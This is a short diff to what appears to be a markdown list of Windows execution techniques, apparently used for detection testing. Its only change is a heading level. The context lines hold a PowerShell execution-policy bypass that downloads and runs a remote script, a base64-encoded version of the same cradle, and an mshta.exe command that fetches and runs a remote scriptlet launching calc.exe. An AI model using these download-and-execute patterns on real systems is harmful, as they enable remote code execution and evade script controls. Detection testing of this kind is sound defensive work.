@@ -11,6 +11,6 @@ powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('h
 ### Base 64 Encoded Execution
 powershell -noprofile -noninteractive -executionpolicy bypass -encodedcommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBlAHgAZQBjACAAQgB5AHAAYQBzAHMAIAAtAEMAIAAiAEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGwAbwBzAHQAdAByAG8AbABsAC8AYgBsAHUAZQB0AGUAcwB0AHMALwBtAGEAaQBuAC8AaQBuAHYAbwBrAGUAYwBhAGwAYwAuAHAAcwAxACcAKQA7AGkAbgB2AG8AawBlAC0AYwBhAGwAYwAiAA==
 
-### MSHTA
+## MSHTA
 The command will use MSHTA to download a payload that executes calc.exe
 mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/losttroll/runcalc/main/calc.sct").Exec();close();
